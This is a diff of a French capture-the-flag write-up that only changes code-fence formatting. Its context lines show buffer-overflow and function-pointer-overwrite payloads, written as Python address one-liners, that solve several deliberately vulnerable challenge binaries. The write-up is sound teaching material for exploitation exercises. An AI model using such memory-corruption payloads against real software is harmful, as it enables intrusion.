@@ -24,14 +24,14 @@ Semi finales
 
 On débute avec le programme baptisé *overflow* (Merci *Captain Obvious*).  
 
-```plain
+```
 $ ./overflow 
 Usage: ./overflow your_name
 ```
 
 L'overflow est simple à provoquer :  
 
-```plain
+```
 $ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
 Erreur de segmentation
@@ -39,12 +39,12 @@ Erreur de segmentation
 
 On récupère l'adresse de *execute\_me* avec nm :  
 
-```plain
+```
 $ nm overflow | grep execute_me
 080484ad T execute_me
 ```
 
-```plain
+```
 $ ./overflow `python -c "print '\xad\x84\x04\x08'*10"`
 Hello ����������!
 Erreur de segmentation
@@ -52,7 +52,7 @@ Erreur de segmentation
 
 Il ne reste qu'à trouver le bon alignement :  
 
-```plain
+```
 $ ./overflow A`python -c "print '\xad\x84\x04\x08'*10"`
 Hello A����������!
 Erreur de segmentation
@@ -67,7 +67,7 @@ Erreur de segmentation
 
 ### RapidReversing
 
-```plain
+```
 $ ./rapidreversing 
 Give me one arg!
 $ ./rapidreversing abcd
@@ -124,7 +124,7 @@ Le résultat est comparé ensuite à la valeur 0xfeedface. La solution la plus s
 
 Et ça passe :  
 
-```plain
+```
 $ ./rapidreversing 1507843519
 Awesome!
 ```
@@ -139,7 +139,7 @@ On peut aussi utiliser la représentation binaire de 0xfeedface et jouer avec le
 
 ### One in a million
 
-```plain
+```
 $ ./one_in_a_million
 Guess the number.
 666
@@ -152,7 +152,7 @@ Nope, the answer was 236604
 
 Un *ltrace* nous donne quelques informations intéressantes :  
 
-```plain
+```
 $ ltrace ./one_in_a_million
 __libc_start_main([ "./one_in_a_million" ] <unfinished ...>
 time(nil)                                                                = 1464706080
@@ -205,7 +205,7 @@ int main(void)
 }
 ```
 
-```plain
+```
 $ ./gen | ./one_in_a_million 
 Guess the number.
 Awesome!
@@ -215,7 +215,7 @@ Awesome!
 
 Le programme lit du texte depuis l'entrée standard et nous le renvoie préfixé :  
 
-```plain
+```
 $ ./firefault
 Hi there !
 Hi Hi there !!
@@ -268,12 +268,12 @@ La problématique reflète bien des cas que l'on peut trouver dans la réalité,
 
 On pourrait trouver différentes adresses écrivables mais on va simplement réécrire la valeur qui était affecté au pointeur.  
 
-```plain
+```
 [0x08048380]> ? sym.done
 134520876 0x804a02c 01001120054 128.3M 804000:002c 134520876 00101100 134520876.0 0.000000
 ```
 
-```plain
+```
 $ python -c "print '\x2c\xa0\x04\x08' * 12 + '\x7d\x84\x04\x08'" | ./firefault
 Hi ,,,,,,,,,,,,}!
 Awesome!
@@ -285,7 +285,7 @@ Finale
 
 ### Firebird
 
-```plain
+```
 $ ./firebird 
 Usage: ./firebird <address to write to> <value to write there>
 $ ./firebird ABCD EFGH
@@ -303,7 +303,7 @@ Dans le code assembleur on trouve un pointeur sur fonction qu'il nous suffira d'
 0x080484f3    ffd0         call eax
 ```
 
-```plain
+```
 $ ./firebird `python -c "print('\x24\xa0\x04\x08')"` `python -c "print('\x4d\x84\x04\x08')"`
 Value being written: 804844d
 Address being written to: 804a024
@@ -312,7 +312,7 @@ Awesome!
 
 ### Firetruck
 
-```plain
+```
 $ ./firetruck 
 ./firetruck string
 $ ./firetruck ABCD
@@ -360,14 +360,14 @@ On voit que 4 premiers octets sont comparés à une valeur puis les 4 qui suiven
 'icecream'
 ```
 
-```plain
+```
 $  ./firetruck icecream
 Awesome!
 ```
 
 Aditionnellement un simple strings pourrait permettre de résoudre l'exercice :  
 
-```plain
+```
 $ strings firetruck
 /lib/ld-linux.so.2
 g$Ui
@@ -392,7 +392,7 @@ That's not the best truck
 
 ### Charmeleon
 
-```plain
+```
 $ ./charmeleon 
 Usage: ./charmeleon magic_bytes
 $ ./charmeleon ABCD
@@ -412,7 +412,7 @@ Il s'agit d'une simple comparaison :
 0x080484ea    e88effffff   call sym.execute_me
 ```
 
-```plain
+```
 $ ./charmeleon `python -c "print '\x39\xb0\x4a\xf2'"`
 Awesome!
 ```
@@ -425,7 +425,7 @@ Le programme se base sur ncurses et affiche un cadre de 16 \* 16 caractères. On
 
 L'interface ressemble à ceci :  
 
-```plain
+```
  ------------------
  |                |
  |                |
@@ -530,7 +530,7 @@ A nous de ne pas aller trop loin dans l'écrasement de la mémoire pour ne pas o
 
 Dans la pratique il m'aura suffit de remplir une ligne avec l'adresse d'*execute\_me* répétée 4 fois puis de descendre seulement 1 ligne en dehors du tableau avant de quitter :  
 
-```plain
+```
 $ ./snaaaake `python -c "print '\x80\x89\x04\x08'*4"`
 Awesome!
 Erreur de segmentation
